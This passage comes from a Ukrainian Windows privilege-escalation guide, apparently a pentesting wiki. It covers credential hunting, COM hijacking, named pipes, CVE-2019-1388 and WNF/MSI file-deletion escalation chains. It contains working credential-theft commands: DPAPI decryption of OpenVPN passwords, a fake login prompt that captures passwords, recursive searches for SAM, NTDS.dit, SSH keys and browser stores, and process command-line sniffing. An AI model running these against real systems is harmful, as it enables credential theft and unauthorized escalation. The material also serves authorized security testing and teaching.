Приклад web.config з обліковими даними:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### Резервні архіви у вебкорені IIS

Старий ZIP-архів резервної копії, розміщений безпосередньо у вебкорені, з якого обслуговується сайт, може розкрити попередні файли конфігурації та облікові дані, які можна повторно використати. Перш ніж вважати це витоком, перевірте налаштований фізичний шлях сайту та чи справді архів доступний через HTTP. Шлях за замовчуванням `C:\inetpub\wwwroot` — лише один із можливих варіантів. Швидка локальна інвентаризація може вивести назви й розміри файлів, не відкриваючи архіви:

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

Назва архіву не підтверджує, що він містить секрет або що відновлені облікові дані надають вищі привілеї.

### Облікові дані OpenVPN

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### Журнали

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### Запросити облікові дані

Завжди можна **попросити користувача ввести свої облікові дані або навіть облікові дані іншого користувача**, якщо думаєте, що він може їх знати (зауважте, що **прямо просити** клієнта надати **облікові дані** справді **ризиковано**):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **Можливі назви файлів, що містять облікові дані**

Відомі файли, які колись містили **паролі** у **відкритому тексті** або Base64.

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

#### Варіант зі списком імен файлів без розширення Password Safe

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Бази даних Password Safe v3 зазвичай використовують розширення `.psafe3`. Розглядайте файл із відповідною назвою як можливий зашифрований vault; його наявність не означає, що ви можете прочитати його, розблокувати або використати збережені облікові дані. Під час перевірки місць зберігання таких файлів перегляньте доступні профілі користувачів і налаштовані корені спільного доступу до файлів.

Файл KeePass `.kdbx`, який можна прочитати, так само є лише ознакою можливого зашифрованого vault. Щоб розблокувати його, потрібні фактичний master-password і будь-які налаштовані key-файл або фактори облікового запису. Якщо під час авторизованої перевірки в записі знайдено пару хешів LM:NT, перш ніж розглядати [pass-the-hash](../ntlm/README.md#pass-the-hash), перевірте названий обліковий запис, а також те, чи хеш NT є актуальним і приймається службою NTLM цільової системи. Запис у vault сам по собі не надає прав Administrator або SYSTEM; також мають бути доступ до віддаленої служби, права облікового запису й окремий крок виконання через службу, якщо він потрібен. В інвентаризації слід зазначати шлях до vault і можливість його читання, а не виводити вміст бази даних чи збережені облікові дані.

Знайдіть усі запропоновані файли:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

#### Варіант команди пошуку без розширення Password Safe

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### Облікові дані в Кошику

Також перевірте Кошик на наявність облікових даних

Перевірте доступні записи Кошика на наявність видалених резервних копій і архівів конфігурацій, а також файлів, у назвах яких прямо згадуються облікові дані. Корисна резервна копія `.7z`, `.zip` або `.rar` може бути створена кілька місяців тому й мати звичайну назву. Windows зберігає початковий шлях і час видалення в записі `$I`, а видалений файл — у відповідному записі `$R`; перш ніж відкривати архів, перевірте метадані та наявність у поточного облікового запису прав на читання. Видимість залежить від тому, SID користувача та дозволів файлів, тому порожній список не доводить, що відновлюваних резервних копій немає. Вважайте назву архіву приводом для перевірки, а не доказом того, що він містить дійсний секрет.

Доступний видалений файл `.pfx` також може стати зачіпкою для **підписування коду**. Якщо він містить доступний приватний ключ, цим ключем можна підписати змінений скрипт PowerShell; [PowerShell вимагає сертифікат для підписування коду з приватним ключем](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature), а [правила видавця AppLocker перевіряють особу підписувача та область дії правила](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker). Для виконання під обліковим записом іншого користувача поточний обліковий запис має мати змогу змінити саме цей скрипт, чинне правило має приймати отриманий підпис для скрипту й цільового облікового запису, а завдання планувальника або інший процес із вищими привілеями — фактично запускати його. Сама назва файлу `.pfx`, тема сертифіката чи можливість запису до скрипту не підтверджують наявність такого ланцюжка. Перш ніж відкривати матеріали з приватним ключем або запускати завдання, перевірте метадані, ACL, політику та команду, що виконується за розкладом.

Також перевірте доступні бази даних профілів клієнтів обміну повідомленнями, нотатки та отримані файли на наявність зачіпок щодо облікових даних. Експорт ключа відновлення BitLocker може зберігатися у форматі HTML або TXT, іноді всередині архіву з назвою резервної копії. Такі матеріали можуть надати доступ до окремого зашифрованого тому з даними, що містить старіші резервні копії; перевіряйте том і архів лише за наявності відповідного дозволу. Якщо резервна копія містить `NTDS.dit`, для відновлення облікових даних домену офлайн також потрібен відповідний кущ `SYSTEM`, як описано в [процесі роботи з резервними копіями та привілейованими групами](../active-directory-methodology/privileged-groups-and-token-privileges.md). Самі назви файлів і заблокований том не доводять, що існує придатний ключ відновлення чи резервна копія домену.

Щоб **відновити паролі**, збережені в кількох програмах, можна скористатися: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### У реєстрі

**Інші можливі розділи реєстру з обліковими даними**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**Витягування ключів OpenSSH з реєстру.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Історія браузерів

Перевірте наявність баз даних, у яких зберігаються паролі з **Chrome або Firefox**.\
Перевірте наявність баз даних, у яких зберігаються паролі з **Chrome, Edge або Firefox**.\
Також перевірте історію, закладки та обране браузерів — можливо, там зберігаються **паролі**.

Для стандартного профілю Edge **Default** поточного користувача файл `Login Data` розташований у `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default`, а `Local State` — у батьківському каталозі `User Data`. [Microsoft описує розташування профілю за замовчуванням](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars); інший профіль або політика `UserDataDir` можуть змінити це розташування. Наявність файлів — лише привід перевірити сховище облікових даних: з’ясуйте, чи доступні файли для читання, чи маєте відповідний контекст DPAPI користувача або інший дозволений матеріал ключа, а також чи належить збережений логін обліковому запису з вищими привілеями. Перелік лише шляхів не потребує відкриття бази даних або виведення розшифрованих паролів.

Для Firefox [Mozilla зазначає](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile), що `key4.db` і `logins.json` у профілі — це відповідно файли ключа та зашифрованих логінів. Їх наявність — лише привід для перевірки: з’ясуйте, чи доступні для читання обидва файли, чи є в них збережені записи та чи захищений ключ Primary Password, перш ніж робити висновок, що облікові дані можна використати. Якщо відновлені облікові дані належать доменному обліковому запису, окремо перевірте ефективні права цього облікового запису на керування групами та [права групи на читання або розшифрування пароля LAPS](../active-directory-methodology/laps.md); самі артефакти браузера не підтверджують наявність шляху до прав адміністратора.

Інструменти для вилучення паролів із браузерів:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **Перезапис COM DLL**

**Component Object Model (COM)** — це технологія, вбудована в операційну систему Windows, яка забезпечує **взаємодію** між програмними компонентами, написаними різними мовами. Кожен компонент COM **ідентифікується за допомогою ідентифікатора класу (CLSID)**, а функціональність кожного компонента доступна через один або кілька інтерфейсів, ідентифікованих за допомогою ідентифікаторів інтерфейсу (IID).

Класи та інтерфейси COM визначаються в реєстрі відповідно в розділах **HKEY\CLASSES\ROOT\CLSID** і **HKEY\CLASSES\ROOT\Interface**. Цей розділ реєстру створюється шляхом злиття **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

У CLSID цього розділу реєстру можна знайти дочірній розділ реєстру **InProcServer32**, який містить **значення за замовчуванням**, що вказує на **DLL**, і значення **ThreadingModel**, яке може мати значення **Apartment** (однопотокова модель), **Free** (багатопотокова модель), **Both** (однопотокова або багатопотокова модель) чи **Neutral** (модель без прив’язки до потоку).

![Історія браузерів — Перезапис COM DLL: у CLSID цього розділу реєстру можна знайти дочірній розділ реєстру InProcServer32, який містить значення за замовчуванням, що вказує на DLL, і значення...](<../../images/image (729).png>)

По суті, якщо ви можете **перезаписати будь-яку DLL**, яка буде виконуватися, то зможете **підвищити привілеї**, якщо цю DLL запустить інший користувач.

Щоб дізнатися, як зловмисники використовують COM Hijacking як механізм закріплення в системі, перегляньте:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Пошук паролів у файлах і реєстрі**

**Пошук у вмісті файлів**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**Пошук файлу з певною назвою**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**Шукайте в реєстрі назви ключів і паролі**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### Інструменти для пошуку паролів

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **є плагіном msf**. Я створив цей плагін, щоб **автоматично запускати кожен POST-модуль metasploit, який шукає облікові дані** на комп’ютері жертви.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) автоматично шукає всі файли з паролями, згадані на цій сторінці.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) — ще один чудовий інструмент для вилучення паролів із системи.

Інструмент [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) шукає **сеанси**, **імена користувачів** і **паролі** для кількох інструментів, які зберігають ці дані у відкритому тексті (PuTTY, WinSCP, FileZilla, SuperPuTTY і RDP)

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Витік дескрипторів

Уявіть, що **процес, запущений від імені SYSTEM, відкриває новий процес** (`OpenProcess()`) **із повним доступом**. Той самий процес **також створює новий процес** (`CreateProcess()`) **із низькими привілеями, але з успадкуванням усіх відкритих дескрипторів основного процесу**.\
Тоді, якщо ви маєте **повний доступ до процесу з низькими привілеями**, ви можете отримати **відкритий дескриптор привілейованого процесу, створений** за допомогою `OpenProcess()`, і **ін'єктувати shellcode**.\
[Прочитайте цей приклад, щоб дізнатися більше про те, **як виявити й експлуатувати цю вразливість**.](leaked-handle-exploitation.md)\
[Прочитайте **цю іншу публікацію з докладнішим поясненням, як перевіряти й використовувати інші відкриті дескриптори процесів і потоків, успадковані з різними рівнями дозволів (не лише з повним доступом)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Імперсонація клієнта Named Pipe

Сегменти спільної пам'яті, які називають **каналами (pipes)**, забезпечують взаємодію процесів і передавання даних.

Windows має функцію під назвою **Named Pipes**, яка дозволяє не пов'язаним між собою процесам обмінюватися даними, зокрема через різні мережі. Це схоже на архітектуру клієнт/сервер, де визначено ролі **сервера named pipe** і **клієнта named pipe**.

Коли **клієнт** надсилає дані через канал, **сервер**, який створив цей канал, може **перейняти ідентичність** **клієнта**, якщо має необхідні права **SeImpersonate**. Виявивши **привілейований процес**, який взаємодіє через канал, який ви можете імітувати, ви отримуєте можливість **підвищити привілеї**, перейнявши ідентичність цього процесу після його взаємодії зі створеним вами каналом. Інструкції з виконання такої атаки можна знайти [**тут**](named-pipe-client-impersonation.md) і [**тут**](#from-high-integrity-to-system).

Також наведений інструмент дає змогу **перехоплювати обмін даними через named pipe за допомогою інструмента на кшталт Burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **а цей інструмент дає змогу переглядати всі канали, щоб знаходити privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Віддалений запис DWORD через Telephony tapsrv до RCE

Служба Telephony (TapiSrv) у режимі сервера відкриває `\\pipe\\tapsrv` (MS-TRP). Віддалений автентифікований клієнт може зловживати асинхронним шляхом обробки подій на основі mailslot, щоб перетворити `ClientAttach` на довільний **запис 4 байтів** у будь-який наявний файл, доступний для запису користувачу `NETWORK SERVICE`, а потім отримати права адміністратора Telephony й завантажити довільну DLL як служба. Повний ланцюжок:

- Виклик `ClientAttach` зі значенням `pszDomainUser`, що вказує на наявний файл, доступний для запису → служба відкриває його через `CreateFileW(..., OPEN_EXISTING)` і використовує для асинхронного запису подій.
- Кожна подія записує контрольований зловмисником `InitContext` із `Initialize` у цей дескриптор. Зареєструйте line app через `LRegisterRequestRecipient` (`Req_Func 61`), викличте `TRequestMakeCall` (`Req_Func 121`), отримайте події через `GetAsyncEvents` (`Req_Func 0`), а потім зніміть реєстрацію та завершіть роботу, щоб повторювати детерміновані записи.
- Додайте себе до `[TapiAdministrators]` у `C:\Windows\TAPI\tsec.ini`, підключіться знову, а потім викличте `GetUIDllName`, передавши довільний шлях до DLL, щоб виконати `TSPI_providerUIIdentify` від імені `NETWORK SERVICE`.

Докладніше:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Різне

### Розширення файлів, які можуть виконувати код у Windows

Відвідайте сторінку **[https://filesec.io/](https://filesec.io/)**

### Зловживання обробниками протоколів / ShellExecute через рендерери Markdown

Клікабельні посилання Markdown, передані в `ShellExecuteExW`, можуть запускати небезпечні URI-обробники (`file:`, `ms-appinstaller:` або будь-яку зареєстровану схему) та виконувати контрольовані зловмисником файли від імені поточного користувача. Дивіться:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Моніторинг командних рядків на наявність паролів**

Після отримання shell від імені користувача можуть виконуватися заплановані завдання або інші процеси, які **передають облікові дані в командному рядку**. Наведений нижче скрипт кожні дві секунди збирає командні рядки процесів і порівнює поточний стан із попереднім, виводячи всі відмінності.

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## Викрадення паролів із процесів

## Від користувача з низькими привілеями до NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Якщо у вас є доступ до графічного інтерфейсу (через консоль або RDP) і UAC увімкнено, у деяких версіях Microsoft Windows можна запустити термінал або будь-який інший процес від імені "NT\AUTHORITY SYSTEM", використовуючи непривілейований обліковий запис.

Це дає змогу одночасно підвищити привілеї та обійти UAC за допомогою тієї самої вразливості. Крім того, нічого не потрібно встановлювати, а бінарний файл, який використовується під час цього процесу, підписаний і виданий Microsoft.

До уражених систем належать:

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

Щоб експлуатувати цю вразливість, необхідно виконати такі кроки:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

You have all the necessary files and information in the following GitHub repository:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Від середнього до високого рівня цілісності для адміністратора / обхід UAC

Прочитайте це, щоб **дізнатися про рівні цілісності**:


{{#ref}}
integrity-levels.md
{{#endref}}

Потім **прочитайте це, щоб дізнатися про UAC та способи обходу UAC:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Перенаправлення каталогів для завантаження у кореневий каталог вебсервера

Застосунок може створити передбачуваний підкаталог для завантаження, записати в нього ім’я файлу, задане користувачем, а потім обробити цей файл. Якщо користувач із низькими привілеями може видалити цей підкаталог і замінити його junction NTFS до запису на стороні сервера, запис може пройти через junction до каталогу, який обслуговує вебсервер. Розміщений там скрипт може виконуватися від імені облікового запису вебслужби, якщо сервер запускає файли такого типу. Це специфічна для застосунку межа довільного запису; самі по собі доступний для запису каталог завантаження чи наявний junction цього не доводять.

Перевірте точну побудову шляху та час виконання операцій в обробнику завантаження, ефективні права користувача на видалення та створення підкаталогу, ефективні ACL призначення, чи переходить записувач за точками повторного аналізу, а також чи виконує вебсервер файли в цьому каталозі. Окремо підтвердьте ідентичності процесів записувача й вебсервера. Пасивна інвентаризація може показати ACL каталогів і метадані reparse points, але не може встановити поведінку обробника чи майбутню підміну junction. Якщо виконання відбувається від імені облікового запису служби, перш ніж розглядати окремий шлях через привілеї токена, перевірте **фактичний токен процесу**.

## Очищення запланованого завдання з привілеями, запущене через WNF

Заплановане завдання, яке забороняє ручний запуск, усе одно може мати тригер, доступний непривілейованому користувачеві. Під час аудиту завдання з привілеями експортуйте його XML і перевірте **всі** тригери, а також DACL завдання, суб’єкта та дію. Зокрема, `WnfStateChangeTrigger` указує на стан Windows Notification Facility (WNF); якщо цей стан, який можна захистити, дозволяє поточному користувачеві публікувати оновлення, користувач може опосередковано запустити завдання від імені налаштованого облікового запису, попри `<AllowStartOnDemand>false</AllowStartOnDemand>`.<sup>[[43]](#references)</sup>

Наприклад, завдання Recall `\Microsoft\Windows\WindowsAI\Recall\PolicyConfiguration` виконувалося від імені SYSTEM, приймало оновлення стану WNF `7508BCA32C079E41` від звичайного користувача, а потім перевіряло `%LOCALAPPDATA%\CoreAIPlatform.00\UKP\{GUID}`, навіть коли Recall було вимкнено.<sup>[[43]](#references)</sup>

```powershell
schtasks /query /tn "<TASK>" /xml > task.xml
Select-String -Path .\task.xml -Pattern 'WnfStateChangeTrigger|StateName|UserId|ClassId|AllowStartOnDemand'
```

Щоб перевірити доступність, знайдіть `ZwUpdateWnfStateData` у `ntdll.dll`, надішліть порожнє оновлення для восьмибайтового імені стану та зіставте код повернення з даними про останній запуск завдання або активністю Procmon. У наведеному нижче скороченому пробнику використано послідовність байтів із прикладу завдання Recall; підставте байти, експортовані для завдання, яке перевіряєте.<sup>[[43]](#references)</sup>

```c
#include <windows.h>
#include <winternl.h>
typedef NTSTATUS (WINAPI *UpdateWnf)(PVOID,PVOID,ULONG,PVOID,PVOID,PVOID,ULONG);
int main(void) {
    unsigned char stateName[8] = {0x75,0x08,0xBC,0xA3,0x2C,0x07,0x9e,0x41};
    HMODULE ntdll = LoadLibraryW(L"ntdll.dll");
    UpdateWnf update = (UpdateWnf)GetProcAddress(ntdll, "ZwUpdateWnfStateData");
    if (!update) return 1;
    return update(stateName, NULL, 0, NULL, NULL, NULL, 0) < 0;
}
```

### Перетворення рекурсивного очищення на привілейоване видалення

Корисний примітив — це не сам тригер, а привілейована процедура очищення, яка приймає контрольований зловмисником каталог. Простежте операцію від переліку до остаточної зміни: виявлення профілю/сеансу, вибір дочірніх елементів за шаблоном, `SHCreateItemFromParsingName` і `IFileOperation::DeleteItem` — це вагомі ознаки того, що раніше перевірений шлях згодом буде рекурсивно оброблено. Якщо нащадки не відкриваються відносно довірених дескрипторів каталогів і не перевіряються перед видаленням, зловмисник може змінити розв’язання шляху між переліком і використанням.<sup>[[43]](#references)</sup>

Поєднайте тригер WNF із описаною нижче [підміною через oplock, junction і символічне посилання Object Manager](#from-folder-contents-delete-to-system-eop): oplock призупиняє очищення після вибору легітимного дочірнього елемента, а тим часом доступний для запису предок підмінюється, щоб після відновлення привілейоване видалення пройшло через `\RPC Control` до захищеної цілі. У ланцюжку Recall це забезпечило видалення `C:\Config.Msi` від імені SYSTEM, необхідне для задокументованого способу відкату MSI.<sup>[[31]](#references)[[43]](#references)</sup>

### Вкладені нащадки обходять поверхневі виправлення для reparse point

Перевірка лише контрольованого зловмисником кореневого каталогу та його безпосереднього дочірнього елемента не захищає від рекурсивного видалення за шляхом. Залиште ці перевірені об’єкти легітимними, а підміну junction/oplock перемістіть у додатковий дочірній каталог нижче них: зрештою `IFileOperation::DeleteItem` дійде до неперевіреного нащадка й перейде за його новою ціллю. CVE-2026-20941 виникла саме через такий неповний патч: перше виправлення Recall перевіряло `UKP` і каталог із GUID у назві, але залишало стару операцію рекурсивного видалення.<sup>[[43]](#references)</sup>

Безпечний підхід — відкрити **кожного нащадка** відносно вже довіреного дескриптора каталогу, отримати й перевірити остаточний розв’язаний шлях/об’єкт, а потім застосувати позначку видалення до цього перевіреного дескриптора. Не перевіряйте лише префікс, а потім не повертайтеся до рекурсивного видалення за шляхом. Під час перевірки патчів також оглядайте структури в реальному місці виклику: у цьому випадку виконання коду під час роботи з `OBJECT_ATTRIBUTES` у `NtCreateFile` показало ненульовий `RootDirectory` і відносне ім’я `{GUID}\\secure_file.lock`, спростувавши оманливий результат декомпілятора, який натякав на другий примітив `FILE_DELETE_ON_CLOSE`.<sup>[[43]](#references)</sup>

## Від довільного видалення/переміщення/перейменування папки до SYSTEM EoP

Техніка описана [**в цій публікації блогу**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks), а код exploit [**доступний тут**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).<sup>[[31]](#references)[[32]](#references)</sup>

Суть атаки — зловживання функцією відкату Windows Installer для заміни легітимних файлів шкідливими під час видалення програми. Для цього зловмиснику потрібно створити **шкідливий інсталятор MSI**, який використають для викрадення папки `C:\Config.Msi`. Згодом Windows Installer використовуватиме її для зберігання файлів відкату під час видалення інших пакетів MSI; ці файли відкату буде змінено так, щоб вони містили шкідливе навантаження.

### Впровадження шляху очищення через COM Windows Installer (CVE-2025-27727)

Клієнт із низькими привілеями може звернутися до служби `msiexec.exe`, що працює від імені SYSTEM, через COM-об’єкт `CMsiConfigurationManager` (CLSID/IID `{000C101C-0000-0000-C000-000000000046}`). Зворотний аналіз визначив відповідні виклики `IMsiServer`: `MsiBeginTransactionW` зі зміщенням `0xA0` у vtable, `SetEEUIDirectoryAndFilter` зі зміщенням `0xC8` і `CleanupTempPackages` зі зміщенням `0x50`. Ці назви та зміщення отримані зворотним аналізом і можуть відрізнятися в різних збірках.<sup>[[41]](#references)</sup>

Для користувача, який не є адміністратором, `SetEEUIDirectoryAndFilter` імперсонує викликача лише під час відкриття переданого шляху з прапорцями `DELETE`, `FILE_FLAG_BACKUP_SEMANTICS` і `FILE_FLAG_OPEN_REPARSE_POINT`. Це підтверджує, що викликач може видалити каталог, і запобігає переходу за reparse point, але **не** прив’язує перевірений файловий об’єкт до подальшого очищення й не доводить, що його створив Windows Installer.<sup>[[41]](#references)</sup>

